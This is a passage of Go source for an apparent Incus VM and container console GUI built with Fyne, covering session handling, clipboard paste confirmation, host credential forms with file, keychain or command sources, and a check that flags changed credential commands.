				fmt.Sprintf("%s\n\nTarget: %s / %s / %s", confirmPrompt, h.Name, project, name),
				func(yes bool) {
					if yes {
						run()
					}
				}, u.window)
		}
		return btn
	}

	right := container.NewHBox()
	switch strings.ToLower(status) {
	case "running":
		right.Add(do("Stop", theme.MediaStopIcon(), widget.MediumImportance, "",
			func(s *incus.Server) error { return s.StopInstance(project, name, false) }))
		right.Add(do("Force stop", theme.CancelIcon(), widget.DangerImportance,
			"Force stop skips the guest OS shutdown — anything unsaved is lost.",
			func(s *incus.Server) error { return s.StopInstance(project, name, true) }))
		right.Add(do("Restart", theme.ViewRefreshIcon(), widget.MediumImportance,
			"Restart the instance. Graceful shutdown, then boot.",
			func(s *incus.Server) error { return s.RestartInstance(project, name, false) }))
		right.Add(do("Pause", theme.MediaPauseIcon(), widget.MediumImportance, "",
			func(s *incus.Server) error { return s.FreezeInstance(project, name) }))
	case "frozen":
		right.Add(do("Resume", theme.MediaPlayIcon(), widget.MediumImportance, "",
			func(s *incus.Server) error { return s.UnfreezeInstance(project, name) }))
		right.Add(do("Stop", theme.MediaStopIcon(), widget.DangerImportance,
			"Instance is paused — Stop skips graceful shutdown.",
			func(s *incus.Server) error { return s.StopInstance(project, name, true) }))
	case "stopped":
		right.Add(do("Start", theme.MediaPlayIcon(), widget.MediumImportance, "",
			func(s *incus.Server) error { return s.StartInstance(project, name) }))
	default:
		right.Add(widget.NewLabelWithStyle("Transitional state: "+status,
			fyne.TextAlignLeading, fyne.TextStyle{Italic: true}))
	}

	// Border layout keeps Open console pinned to the left and the
	// state actions right-aligned. Prevents left-shift as buttons
	// appear/disappear with status changes.
	return container.NewBorder(nil, nil, openBtn, right, layout.NewSpacer())
}

// infoTitle builds a two-line heading — big bold name, italic subtitle
// with the "type · location" breadcrumb.
func infoTitle(name, sub string) fyne.CanvasObject {
	n := canvas.NewText(name, nil)
	n.TextSize = 22
	n.TextStyle = fyne.TextStyle{Bold: true}
	s := widget.NewLabelWithStyle(sub, fyne.TextAlignLeading, fyne.TextStyle{Italic: true})
	return container.NewVBox(n, s, widget.NewSeparator())
}

// infoTable lays out label/value pairs as a two-column grid so long
// values line up cleanly. Values are rendered with a monospace-ish
// look via TextStyle.Monospace so IPs and fingerprints stay readable.
func infoTable(rows [][2]string) fyne.CanvasObject {
	form := widget.NewForm()
	for _, r := range rows {
		val := widget.NewLabel(r[1])
		val.TextStyle = fyne.TextStyle{Monospace: true}
		val.Wrapping = fyne.TextWrapWord
		form.Append(r[0], val)
	}
	return form
}

// infoLoading is the placeholder card shown while an instance-detail
// fetch is in flight. Uses a fixed-width progress bar rather than the
// full-pane variant so the spinner stays proportional in a large window.
func infoLoading(name string) fyne.CanvasObject {
	bar := widget.NewProgressBarInfinite()
	label := widget.NewLabelWithStyle("Loading "+name+"…",
		fyne.TextAlignCenter, fyne.TextStyle{Italic: true})
	return container.NewCenter(container.NewGridWrap(
		fyne.NewSize(320, 60),
		container.NewVBox(label, bar),
	))
}

// errorCard renders a clean "operation X failed with Y" card so error
// paths don't leave the main pane looking abandoned. Uses a red-tinted
// bold heading so operators spot it at a glance in a busy window.
func errorCard(what string, err error) fyne.CanvasObject {
	title := canvas.NewText(what+" failed", theme.Color(theme.ColorNameError))
	title.TextSize = 18
	title.TextStyle = fyne.TextStyle{Bold: true}
	title.Alignment = fyne.TextAlignCenter
	body := widget.NewLabel(err.Error())
	body.Wrapping = fyne.TextWrapWord
	body.Alignment = fyne.TextAlignCenter
	return container.NewCenter(container.NewGridWrap(
		fyne.NewSize(480, 120),
		container.NewVBox(title, body),
	))
}

// toggleTheme cycles through dark → light → follow-system. Applied
// immediately and persisted so the choice survives a restart. Provides a
// one-click alternative to opening the settings dialog.
func (u *ui) toggleTheme() {
	prefs := u.fyneApp.Preferences()
	next := branding.VariantDark
	switch prefs.String(prefKeyThemeVariant) {
	case branding.VariantDark:
		next = branding.VariantLight
	case branding.VariantLight:
		next = branding.VariantAuto
	case branding.VariantAuto:
		next = branding.VariantDark
	}
	prefs.SetString(prefKeyThemeVariant, next)
	u.fyneApp.Settings().SetTheme(branding.Theme{Variant: next})
}

// showSelectedInfo re-shows the info panel for whatever the sidebar's
// last selected row was. Handy after the user has been staring at a
// console and wants to see instance metadata again without navigating
// back to the tree.
func (u *ui) showSelectedInfo() {
	if u.lastSelectedHost == "" {
		dialog.ShowInformation("Nothing selected",
			"Click a host, project, or instance in the sidebar first.", u.window)
		return
	}
	// Prefer the most-specific selection: activeKey (currently-open
	// console) → last VM click → falls back to the host.
	if u.activeKey != (sessionKey{}) {
		go u.showInstanceInfo(u.activeKey.host, u.activeKey.project, u.activeKey.vm)
		return
	}
	go u.showHostInfo(u.lastSelectedHost)
}

// openConfigFile opens the YAML config file in the OS's default
// handler for text/yaml. Users who want ghostty-style live editing can
// edit the file directly and use the Refresh button to pick up
// changes; a full fsnotify watcher is on the roadmap.
func (u *ui) openConfigFile() {
	p, err := config.Path()
	if err != nil {
		dialog.ShowError(err, u.window)
		return
	}
	// Ensure the file exists so a fresh install doesn't hand the OS
	// handler an empty argument.
	if _, err := os.Stat(p); err != nil {
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			dialog.ShowError(err, u.window)
			return
		}
		if err := os.WriteFile(p, []byte("hosts: []\n"), 0o600); err != nil {
			dialog.ShowError(err, u.window)
			return
		}
	}
	if err := openInSystemEditor(p); err != nil {
		dialog.ShowError(err, u.window)
	}
}

// openInSystemEditor dispatches to the OS's per-platform default
// application launcher: `open` on macOS, `xdg-open` on Linux/BSD, and
// `explorer` on Windows.
func openInSystemEditor(path string) error {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		cmd = exec.Command("open", path)
	case "windows":
		cmd = exec.Command("explorer", path)
	default:
		cmd = exec.Command("xdg-open", path)
	}
	return cmd.Start()
}

// buildLoadingPane is the "Connecting…" screen shown between a tree
// click and the real console (SPICE handshake for VMs, exec setup for
// containers). Two lines of text plus an infinite progress bar.
func buildLoadingPane(key sessionKey, isContainer bool) fyne.CanvasObject {
	kind := "SPICE console"
	if isContainer {
		kind = "container shell"
	}
	title := widget.NewLabelWithStyle(
		fmt.Sprintf("Opening %s for %s…", kind, key.vm),
		fyne.TextAlignCenter, fyne.TextStyle{Bold: true},
	)
	sub := widget.NewLabelWithStyle(
		fmt.Sprintf("%s / %s", key.host, key.project),
		fyne.TextAlignCenter, fyne.TextStyle{Italic: true},
	)
	bar := widget.NewProgressBarInfinite()
	return container.NewCenter(
		container.NewVBox(title, sub, container.NewGridWrap(fyne.NewSize(320, 8), bar)),
	)
}

// startContainerSession opens a bash-or-sh shell inside the container
// via incus exec and wires it to a full VT100 terminal widget. Handles
// colors, cursor addressing, arrow keys, ^C — the whole shape a modern
// shell user expects. vim, htop, less all work.
func (u *ui) startContainerSession(h config.Host, key sessionKey) {
	srv, err := u.serverFor(h)
	if err != nil {
		u.showError(err)
		return
	}
	log.Printf("incus-console: opening shell for %s", key)
	sh, err := srv.OpenShellInProject(key.project, key.vm)
	if err != nil {
		u.showError(fmt.Errorf("open shell: %w", err))
		return
	}

	// The terminal widget reads from the guest and writes user input
	// straight to the PTY — full raw bytes, no line buffering, no
	// local echo, all the ANSI CSI sequences interpreted natively.
	term := terminal.New()
	go func() {
		// RunWithConnection blocks until the shell exits or the WS
		// closes. Errors here are informational — the session is
		// already torn down by the time we notice.
		if err := term.RunWithConnection(sh, sh); err != nil {
			log.Printf("incus-console: shell terminal ended: %v", err)
		}
	}()

	title := widget.NewLabel(fmt.Sprintf("%s / %s / %s (shell)", key.host, key.project, key.vm))
	closeBtn := widget.NewButton("Close session", func() { u.closeSession(key) })
	header := container.NewBorder(nil, nil, title, closeBtn)
	body := container.NewBorder(header, nil, nil, nil, term)

	focusInput := func() { fyneDo(func() { u.window.Canvas().Focus(term) }) }
	s := &session{
		key:     key,
		shell:   sh,
		content: body,
		onFocus: focusInput,
	}
	u.mu.Lock()
	u.sessions[key] = s
	u.mu.Unlock()

	u.showInPane(body, key)
	focusInput()
}

func (u *ui) startSession(h config.Host, key sessionKey) {
	srv, err := u.serverFor(h)
	if err != nil {
		u.showError(err)
		return
	}
	log.Printf("incus-console: opening console for %s", key)
	console, err := srv.OpenConsoleInProject(key.project, key.vm)
	if err != nil {
		u.showError(fmt.Errorf("open console: %w", err))
		return
	}

	drv := driver.New()
	// Tell the driver which Canvas we're rendered into so its toolbar
	// buttons (Ctrl+Alt+Del, Paste, Reset) can pull focus back to the
	// surface after firing. Without this, one button click steals focus
	// from the VM and Tab / arrow keys stop reaching the guest.
	drv.AttachToCanvas(u.window.Canvas())

	// Fire the "Disconnected" banner as soon as any SPICE channel dies —
	// usually means the VM was stopped or crashed. Reset VM re-opens
	// with a fresh console so this is the definitive "you lost the box"
	// signal.
	console.OnMirrorEnded = func() {
		log.Printf("incus-console: SPICE session ended for %s", key)
		drv.SetStatus("Disconnected — click Reset VM or Close session")
	}

	// Header showing which VM is currently displayed + per-session
	// actions (install agent, close session).
	title := widget.NewLabel(fmt.Sprintf("%s / %s / %s", key.host, key.project, key.vm))
	installBtn := widget.NewButton("Install incus-agent…", func() {
		u.showInstallAgentDialog(key)
	})
	closeBtn := widget.NewButton("Close session", func() { u.closeSession(key) })
	header := container.NewBorder(nil, nil, title, container.NewHBox(installBtn, closeBtn))
	body := container.NewBorder(header, nil, nil, nil, drv.Content())

	s := &session{
		key:     key,
		console: console,
		drv:     drv,
		content: body,
		onFocus: drv.RequestFocus,
	}
	u.mu.Lock()
	u.sessions[key] = s
	u.mu.Unlock()

	drv.OnReset = func() {
		// Confirm — Reset issues a hard restart with Force:true (see
		// connector.go ResetVM). The toolbar button sits inches from
		// Ctrl+Alt+Del in the SPICE surface, so an accidental click
		// on a prod box would be catastrophic. Name the exact target
		// in the prompt so operators with multiple sessions open
		// don't reset the wrong cluster.
		dialog.ShowConfirm(
			"Reset "+key.vm+"?",
			fmt.Sprintf("Hard-restart the VM on %s / %s? The guest OS gets no shutdown signal — unsaved work is lost.", key.host, key.project),
			func(yes bool) {
				if yes {
					go u.resetSession(key)
				}
			}, u.window)
	}
	drv.OnPasteRequest = func() {
		text := u.window.Clipboard().Content()
		if text == "" {
			log.Printf("incus-console: paste — clipboard is empty")
			return
		}
		// Never log the clipboard text itself — could be a BitLocker
		// recovery key, password, etc. Just log the length.
		log.Printf("incus-console: paste — %d chars pending for %s", len(text), key)

		// Anything above the confirm threshold triggers a "are you sure"
		// dialog. Threshold used to be 100 — but a BitLocker recovery
		// key is 48 digits and an SSH passphrase is typically 20-40
		// chars, so both slipped through silently. 24 is small enough
		// to catch those AND typical secrets, large enough to let
		// short commands paste without friction.
		const confirmThreshold = 24
		doPaste := func() { go drv.PasteText(text) }
		if len(text) > confirmThreshold {
			dialog.ShowConfirm("Paste large clipboard",
				fmt.Sprintf("Type %d characters into the VM? This takes ~%d ms and is not undoable.",
					len(text), len(text)*8),
				func(yes bool) {
					if yes {
						doPaste()
					}
				}, u.window)
			return
		}
		doPaste()
	}

	// Guest → host: when the guest agent hands us text, drop it on the
	// host OS clipboard so a plain paste works in the user's next app.
	drv.OnGuestClipboard = func(text string) {
		fyneDo(func() { u.window.Clipboard().SetContent(text) })
	}

	// Guest agent asks for our current host clipboard on every paste
	// inside the VM. Serve it straight from the Fyne clipboard.
	// Clipboard access must happen on the main thread — the driver's
	// background goroutine invokes this callback.
	drv.HostClipboard = func() string {
		var out string
		fyne.DoAndWait(func() { out = u.window.Clipboard().Content() })
		return out
	}

	// Poll the host clipboard for changes so we can announce them to
	// the guest. 500 ms tick is 2 reads/sec — Fyne's clipboard call is
	// a cheap single OS call, no CPU worry. The feedback-loop guard:
	// skip announcement when the current content is exactly what we
	// last received from the guest (i.e. guest → host wrote it a moment ago).
	go u.clipboardPoll(key)

	u.showInPane(body, key)
	// Focus AFTER the surface is part of the visible widget tree.
	// AttachToCanvas earlier can't do this because the widget is only
	// added to the container in the current function scope — Fyne's
	// Canvas.Focus is a no-op on a widget that isn't yet visible.
	if s.onFocus != nil {
		s.onFocus()
	}
	u.spawnSpice(s)
}

// spawnSpice launches spice.New against the session's current console
// handle. Called on first connect and again after a reset.
func (u *ui) spawnSpice(s *session) {
	go func() {
		log.Printf("incus-console: starting spice.New for %s", s.key)
		cl, err := spice.New(s.console, s.drv, "")
		if err != nil {
			log.Printf("incus-console: spice.New failed: %v", err)
			u.showError(fmt.Errorf("spice: %w", err))
			return
		}
		// Debug logging is opt-in via env — SPICE handshakes carry
		// session IDs, agent capabilities and clipboard sizes we do
		// not want in stderr by default (some deployments ship stderr
		// to shared collectors). Set INCUS_CONSOLE_SPICE_DEBUG=1 to
		// enable when diagnosing a wire-level issue.
		if os.Getenv("INCUS_CONSOLE_SPICE_DEBUG") == "1" {
			cl.Debug = log.Default()
		}
		// Cap the per-channel byte budget so a hostile or wedged
		// server can't stream 10 MB frames until we OOM. 8 GiB is
		// generous for a real desktop session (~2h of aggressive
		// scrolling) and hard to hit accidentally.
		cl.MaxSessionBytes = 8 << 30
		log.Printf("incus-console: spice.New returned OK for %s", s.key)
	}()
}

func (u *ui) resetSession(key sessionKey) {
	u.mu.Lock()
	s, ok := u.sessions[key]
	u.mu.Unlock()
	if !ok {
		return
	}
	host := u.cfg.Host(key.host)
	if host == nil {
		return
	}
	srv, err := u.serverFor(*host)
	if err != nil {
		u.showError(err)
		return
	}

	log.Printf("incus-console: reset VM %s", key)
	s.drv.SetStatus("Resetting VM…")
	if err := srv.ResetVMInProject(key.project, key.vm); err != nil {
		s.drv.SetStatus("Reset failed")
		u.showError(err)
		return
	}

	// The old SPICE session is dead now — swap in a new console.
	s.drv.SetStatus("Reconnecting…")
	var newConsole *incus.SpiceConsole
	var lastErr error
	for i := 0; i < 20; i++ {
		time.Sleep(500 * time.Millisecond)
		newConsole, lastErr = srv.OpenConsoleInProject(key.project, key.vm)
		if lastErr == nil {
			break
		}
	}
	if newConsole == nil {
		s.drv.SetStatus("Reconnect failed")
		u.showError(fmt.Errorf("reconnect: %w", lastErr))
		return
	}
	_ = s.console.Close()
	// Re-wire the disconnect banner onto the new console handle — the
	// hook only fires against the exact SpiceConsole it was set on.
	newConsole.OnMirrorEnded = func() {
		log.Printf("incus-console: SPICE session ended for %s", key)
		s.drv.SetStatus("Disconnected — click Reset VM or Close session")
	}
	s.console = newConsole
	u.spawnSpice(s)
}

func (u *ui) closeSession(key sessionKey) {
	u.mu.Lock()
	s, ok := u.sessions[key]
	if ok {
		delete(u.sessions, key)
	}
	u.mu.Unlock()
	if !ok {
		return
	}
	if s.console != nil {
		_ = s.console.Close()
	}
	if s.shell != nil {
		_ = s.shell.Close()
	}
	// If the closed session was the one on screen, revert to empty state.
	if len(u.holder.Objects) > 0 && u.holder.Objects[len(u.holder.Objects)-1] == s.content {
		u.showInPane(u.empty, sessionKey{})
	}
}

// showInPane swaps the main pane's visible child. Pass a zero sessionKey
// to indicate "no active session" (empty-state placeholder). The sidebar
// tree is refreshed so the highlight follows the active session, and the
// window title updates so a user with several incus-console windows across
// desktops can see at a glance which VM each one is showing.
func (u *ui) showInPane(obj fyne.CanvasObject, key sessionKey) {
	u.mu.Lock()
	u.activeKey = key
	u.mu.Unlock()
	fyneDo(func() {
		u.holder.Objects = []fyne.CanvasObject{obj}
		u.holder.Refresh()
		u.tree.Refresh()
		if key == (sessionKey{}) {
			u.window.SetTitle("incus-console")
		} else {
			u.window.SetTitle(fmt.Sprintf("incus-console — %s / %s / %s%s",
				key.host, key.project, key.vm, u.scopeBadge(key.host)))
		}
	})
}

// scopeBadge summarises the trust-scope of the client cert on the
// given host as a short suffix operators can eyeball from the title
// bar. "admin" for unrestricted trust, "restricted (proj1,proj2)"
// when the cert is scoped, empty when we haven't queried whoami yet.
// Kept short — the title bar space is limited.
func (u *ui) scopeBadge(hostName string) string {
	u.mu.Lock()
	id := u.identity[hostName]
	u.mu.Unlock()
	if id == nil {
		return ""
	}
	if id.Restricted {
		return "  [restricted]"
	}
	return "  [admin]"
}

// --- Host form (add / edit) --------------------------------------------

func (u *ui) selectedHost() *config.Host {
	if u.lastSelectedHost == "" {
		dialog.ShowInformation("No host selected",
			"Click a host in the sidebar first.", u.window)
		return nil
	}
	return u.cfg.Host(u.lastSelectedHost)
}

func (u *ui) showHostForm(existing *config.Host) {
	title := "Add host"
	var initial config.Host
	if existing != nil {
		title = "Edit host"
		initial = *existing
	}

	name := widget.NewEntry()
	name.SetPlaceHolder("alpine-01")
	name.SetText(initial.Name)

	url := widget.NewEntry()
	url.SetPlaceHolder("https://alpine-01.internal:8443")
	url.SetText(initial.URL)

	project := widget.NewEntry()
	project.SetPlaceHolder("default   (leave empty for default project)")
	project.SetText(initial.Project)

	// Detect the current credential source so the edit dialog opens on
	// the right tab. Priority mirrors creds.Load.
	initialSource := "file"
	switch {
	case initial.TLSClientCertKeychain != "" || initial.TLSClientKeyKeychain != "":
		initialSource = "keychain"
	case initial.TLSClientCertCommand != "" || initial.TLSClientKeyCommand != "":
		initialSource = "command"
	}

	// Server cert stays a plain file field regardless of credential
	// source — it's a pinned public cert, not secret material.
	srv := widget.NewEntry()
	srv.SetPlaceHolder("(optional) path to server.crt to pin against")
	srv.SetText(initial.TLSServerCert)

	// -- File source widgets --
	certPath := widget.NewEntry()
	certPath.SetPlaceHolder("path to client.crt")
	certPath.SetText(initial.TLSClientCert)
	keyPath := widget.NewEntry()
	keyPath.SetPlaceHolder("path to client.key")
	keyPath.SetText(initial.TLSClientKey)

	// -- Command source widgets --
	certCmd := widget.NewEntry()
	certCmd.SetPlaceHolder("shell command whose stdout is the PEM cert")
	certCmd.SetText(initial.TLSClientCertCommand)
	keyCmd := widget.NewEntry()
	keyCmd.SetPlaceHolder("shell command whose stdout is the PEM key")
	keyCmd.SetText(initial.TLSClientKeyCommand)

	// -- Keychain source widgets --
	// Paste the PEM here on save; the bytes go straight into the OS
	// keychain and the config just holds an account name reference.
	// The dialog does NOT show existing values back — that would leak
	// the PEM into the widget after import. Instead we show whether
	// something is stored.
	certPEM := widget.NewMultiLineEntry()
	certPEM.SetPlaceHolder("Paste PEM cert here to import into keychain\n(leave empty to keep the existing stored copy)")
	certPEM.Wrapping = fyne.TextWrapOff
	keyPEM := widget.NewMultiLineEntry()
	keyPEM.SetPlaceHolder("Paste PEM key here to import into keychain\n(leave empty to keep the existing stored copy)")
	keyPEM.Wrapping = fyne.TextWrapOff
	certStatus := widget.NewLabel(keychainStatusLine("cert", initial.TLSClientCertKeychain))
	keyStatus := widget.NewLabel(keychainStatusLine("key", initial.TLSClientKeyKeychain))

	// Group each source into its own container; the selector swaps
	// which one is visible.
	fileGroup := container.NewVBox(
		widget.NewLabelWithStyle("Store the PEM as a plaintext file on disk (simplest, least secure).",
			fyne.TextAlignLeading, fyne.TextStyle{Italic: true}),
		widget.NewForm(
			widget.NewFormItem("Client cert path", certPath),
			widget.NewFormItem("Client key path", keyPath),
		),
	)
	keychainGroup := container.NewVBox(
		widget.NewLabelWithStyle("Store the PEM in the OS keychain (Login Keychain on macOS, libsecret on Linux, Credential Manager on Windows). Paste the PEM below to import; existing entries stay unless replaced.",
			fyne.TextAlignLeading, fyne.TextStyle{Italic: true}),
		certStatus,
		certPEM,
		keyStatus,
		keyPEM,
	)
	commandGroup := container.NewVBox(
		widget.NewLabelWithStyle("Fetch the PEM from a shell command whose stdout is the PEM (sops+age, 1Password, Vault, YubiKey, sshcrypt, …). Re-run per connection.",
			fyne.TextAlignLeading, fyne.TextStyle{Italic: true}),
		widget.NewForm(
			widget.NewFormItem("Client cert command", certCmd),
			widget.NewFormItem("Client key command", keyCmd),
		),
	)

	credStack := container.NewStack()
	switch initialSource {
	case "keychain":
		credStack.Objects = []fyne.CanvasObject{keychainGroup}
	case "command":
		credStack.Objects = []fyne.CanvasObject{commandGroup}
	default:
		credStack.Objects = []fyne.CanvasObject{fileGroup}
	}
	sourceSel := widget.NewRadioGroup(
		[]string{"file", "keychain", "command"},
		func(v string) {
			switch v {
			case "keychain":
				credStack.Objects = []fyne.CanvasObject{keychainGroup}
			case "command":
				credStack.Objects = []fyne.CanvasObject{commandGroup}
			default:
				credStack.Objects = []fyne.CanvasObject{fileGroup}
			}
			credStack.Refresh()
		})
	sourceSel.Selected = initialSource
	sourceSel.Horizontal = true

	baseForm := widget.NewForm(
		widget.NewFormItem("Name", name),
		widget.NewFormItem("URL", url),
		widget.NewFormItem("Project", project),
		widget.NewFormItem("Server cert", srv),
	)
	form := container.NewVBox(
		baseForm,
		widget.NewSeparator(),
		widget.NewLabelWithStyle("Credential source", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		sourceSel,
		credStack,
	)
	d := dialog.NewCustomConfirm(title, "Save", "Cancel", form, func(ok bool) {
		if !ok {
			return
		}
		hostName := strings.TrimSpace(name.Text)
		h := config.Host{
			Name:          hostName,
			URL:           strings.TrimSpace(url.Text),
			Project:       strings.TrimSpace(project.Text),
			TLSServerCert: strings.TrimSpace(srv.Text),
		}
		switch sourceSel.Selected {
		case "file":
			h.TLSClientCert = strings.TrimSpace(certPath.Text)
			h.TLSClientKey = strings.TrimSpace(keyPath.Text)
		case "command":
			h.TLSClientCertCommand = strings.TrimSpace(certCmd.Text)
			h.TLSClientKeyCommand = strings.TrimSpace(keyCmd.Text)
		case "keychain":
			// Account names are deterministic from the host name so
			// they survive renames only when the user re-imports; a
			// rename mid-life orphans the old keychain entry, which is
			// a rare enough case to not warrant tracking a stable ID.
			certAcc := hostName + "-client-cert"
			keyAcc := hostName + "-client-key"
			if pem := strings.TrimSpace(certPEM.Text); pem != "" {
				if err := creds.StoreInKeychain(certAcc, []byte(pem)); err != nil {
					dialog.ShowError(fmt.Errorf("store cert in keychain: %w", err), u.window)
					return
				}
			}
			if pem := strings.TrimSpace(keyPEM.Text); pem != "" {
				if err := creds.StoreInKeychain(keyAcc, []byte(pem)); err != nil {
					dialog.ShowError(fmt.Errorf("store key in keychain: %w", err), u.window)
					return
				}
			}
			// Preserve prior account names when the user leaves the
			// paste boxes empty on an Edit (they meant "keep existing").
			if certPEM.Text == "" && initial.TLSClientCertKeychain != "" {
				certAcc = initial.TLSClientCertKeychain
			}
			if keyPEM.Text == "" && initial.TLSClientKeyKeychain != "" {
				keyAcc = initial.TLSClientKeyKeychain
			}
			h.TLSClientCertKeychain = certAcc
			h.TLSClientKeyKeychain = keyAcc
		}
		if err := validateHost(h); err != nil {
			dialog.ShowError(err, u.window)
			return
		}
		if existing == nil {
			u.cfg.Hosts = append(u.cfg.Hosts, h)
		} else {
			for i := range u.cfg.Hosts {
				if u.cfg.Hosts[i].Name == existing.Name {
					u.cfg.Hosts[i] = h
					break
				}
			}
		}
		if err := u.cfg.Save(); err != nil {
			dialog.ShowError(err, u.window)
			return
		}
		u.tree.Refresh()
	}, u.window)
	d.Resize(fyne.NewSize(560, 360))
	d.Show()
}

// validateHost surfaces the mistakes that would otherwise turn into
// cryptic TLS errors on first connect (missing cert files, empty URL,
// http:// instead of https://). Cheap sanity check, saves 30 seconds
// of "why doesn't this work" every time a user adds a host.
func validateHost(h config.Host) error {
	if h.Name == "" {
		return fmt.Errorf("Name is required")
	}
	if h.URL == "" {
		return fmt.Errorf("URL is required")
	}
	if !strings.HasPrefix(h.URL, "https://") {
		return fmt.Errorf("URL must start with https://")
	}
	// One of {file, command, keychain} must be set per credential.
	if h.TLSClientCert == "" && h.TLSClientCertCommand == "" && h.TLSClientCertKeychain == "" {
		return fmt.Errorf("Client cert: path, command, or keychain account required")
	}
	if h.TLSClientKey == "" && h.TLSClientKeyCommand == "" && h.TLSClientKeyKeychain == "" {
		return fmt.Errorf("Client key: path, command, or keychain account required")
	}
	// Only stat file paths — commands and keychain accounts are
	// runtime lookups.
	if h.TLSClientCertKeychain == "" && h.TLSClientCertCommand == "" {
		if _, err := os.Stat(h.TLSClientCert); err != nil {
			return fmt.Errorf("Client cert: %w", err)
		}
	}
	if h.TLSClientKeyKeychain == "" && h.TLSClientKeyCommand == "" {
		if _, err := os.Stat(h.TLSClientKey); err != nil {
			return fmt.Errorf("Client key: %w", err)
		}
	}
	// Server cert is optional; validate only if provided.
	if h.TLSServerCert != "" {
		if _, err := os.Stat(h.TLSServerCert); err != nil {
			return fmt.Errorf("Server cert: %w", err)
		}
	}
	return nil
}

func (u *ui) confirmDeleteHost(h *config.Host) {
	dialog.ShowConfirm("Delete host",
		fmt.Sprintf("Remove %q from the host list?\n\nAny credentials stored under this host's account names in the OS keychain will be deleted too.", h.Name),
		func(yes bool) {
			if !yes {
				return
			}
			// Delete keychain-stored PEMs so no orphaned secrets sit
			// in the OS store after the host is gone. Failing to
			// delete is not fatal — surface but keep going with the
			// config removal so the user isn't wedged.
			if h.TLSClientCertKeychain != "" {
				if err := creds.DeleteFromKeychain(h.TLSClientCertKeychain); err != nil {
					log.Printf("incus-console: could not remove cert from keychain: %v", err)
				}
			}
			if h.TLSClientKeyKeychain != "" {
				if err := creds.DeleteFromKeychain(h.TLSClientKeyKeychain); err != nil {
					log.Printf("incus-console: could not remove key from keychain: %v", err)
				}
			}
			for i := range u.cfg.Hosts {
				if u.cfg.Hosts[i].Name == h.Name {
					u.cfg.Hosts = append(u.cfg.Hosts[:i], u.cfg.Hosts[i+1:]...)
					break
				}
			}
			if err := u.cfg.Save(); err != nil {
				dialog.ShowError(err, u.window)
				return
			}
			u.tree.Refresh()
		}, u.window)
}

// --- helpers -----------------------------------------------------------

// fyneDo hops fn onto Fyne's main thread. Fyne v2.7+ enforces that all
// widget mutation happens on the main thread — refreshing a widget from
// a random goroutine now trips a warning and, in the worst case, crashes
// the harfbuzz text shaper (which is not reentrant). fyne.Do is
// non-blocking so this is safe to call from either the main thread or a
// background goroutine.
func fyneDo(fn func()) { fyne.Do(fn) }

// showError posts a dialog.ShowError from any goroutine safely.
func (u *ui) showError(err error) {
	fyneDo(func() { dialog.ShowError(err, u.window) })
}

// showInfo posts a dialog.ShowInformation from any goroutine safely.
func (u *ui) showInfo(title, body string) {
	fyneDo(func() { dialog.ShowInformation(title, body, u.window) })
}

// keychainStatusLine renders a "no cert stored" / "cert stored under
// account X" caption for the keychain source section of the host form.
// Never touches the stored bytes.
func keychainStatusLine(label, account string) string {
	if account == "" {
		return "No " + label + " stored in keychain yet."
	}
	return label + " is stored under account: " + account
}

// suspiciousCommandDiff returns human-readable descriptions of hosts
// whose credential command strings changed between the currently-live
// config and a freshly-loaded one. Any change to a command that will
// be `sh -c`'d on the next connect is treated as "needs approval".
// Same-string commands, or a switch away from command source entirely,
// are safe and produce no entries.
func suspiciousCommandDiff(prev, next []config.Host) []string {
	byName := make(map[string]config.Host, len(prev))
	for _, h := range prev {
		byName[h.Name] = h
	}
	var out []string
	for _, nh := range next {
		ph, existed := byName[nh.Name]
		if !existed {
			// A newly-added host with a command source is suspicious
			// even without a prior value to compare — command was
			// injected fresh onto disk.
			if nh.TLSClientCertCommand != "" || nh.TLSClientKeyCommand != "" {
				out = append(out, "  • "+nh.Name+"  (new host with command-source credentials)")
			}
			continue
		}
		if ph.TLSClientCertCommand != nh.TLSClientCertCommand && nh.TLSClientCertCommand != "" {
			out = append(out, "  • "+nh.Name+"  (client cert command changed)")
		}
		if ph.TLSClientKeyCommand != nh.TLSClientKeyCommand && nh.TLSClientKeyCommand != "" {
			out = append(out, "  • "+nh.Name+"  (client key command changed)")
		}
	}
	return out
}

// archParts splits a "goos/goarch" key ("windows/amd64", "linux/arm64")
// back into its two components. Companion to goArchFromIncus.
func archParts(key string) (goos, goarch string) {
	if slash := strings.IndexByte(key, '/'); slash > 0 {
		return key[:slash], key[slash+1:]
	}
	return key, ""
}

// goArchFromIncus translates the incus API's OS/arch shape into the
// canonical <os>/<arch> key we use in Config.AgentBinaries. incus reports
// arches like "x86_64" / "aarch64" and free-text OS names like
// "Windows 11" or "Ubuntu"; we normalize those to Go's convention
// ("windows/amd64", "linux/arm64") so the agent lookup is deterministic.
func goArchFromIncus(arch, osName string) string {
	var goArch string
	switch strings.ToLower(arch) {
	case "x86_64", "amd64":
		goArch = "amd64"
	case "aarch64", "arm64":
		goArch = "arm64"
	default:
		goArch = strings.ToLower(arch)
	}
	goOS := "linux"
	if strings.Contains(strings.ToLower(osName), "windows") {
		goOS = "windows"
	}
	return goOS + "/" + goArch
}

// showSettingsDialog exposes app-wide configuration — the incus-agent
// binary registry keyed by <os>/<arch>.
func (u *ui) showSettingsDialog() {
	// Common OS/arch combinations. Rows for other targets can be added
	// via manual YAML edit of config.yaml if needed.
	knownArchs := []string{
		"windows/amd64",
		"windows/arm64",
		"linux/amd64",
		"linux/arm64",
	}
	// Detected server version — read from any host we've connected to
	// this session. When more than one host is known and they disagree,
	// pick the highest string (rough — server versions are semver-like
	// so lexicographic works within a single major train).
	detected := ""
	u.mu.Lock()
	for _, id := range u.identity {
		if id != nil && id.ServerVersion > detected {
			detected = id.ServerVersion
		}
	}
	u.mu.Unlock()

	versionEntry := widget.NewEntry()
	versionEntry.SetPlaceHolder("e.g. 6.7 — detected from any connected host")
	if detected != "" {
		versionEntry.SetText(detected)
	}

	entries := make(map[string]*widget.Entry, len(knownArchs))
	items := make([]*widget.FormItem, 0, len(knownArchs))
	for _, arch := range knownArchs {
		e := widget.NewEntry()
		suffix := ""
		if strings.HasPrefix(arch, "windows/") {
			suffix = ".exe"
		}
		e.SetPlaceHolder("path to incus-agent-" + strings.ReplaceAll(arch, "/", "-") + suffix)
		if v, ok := u.cfg.AgentBinaries[arch]; ok {
			e.SetText(v)
		}
		entries[arch] = e

		// Per-row Fetch button — downloads the binary matching the
		// version box above into the entry's path (or a default under
		// the config dir if the entry is blank). Runs on a goroutine
		// so the settings dialog doesn't freeze during download.
		archCap := arch
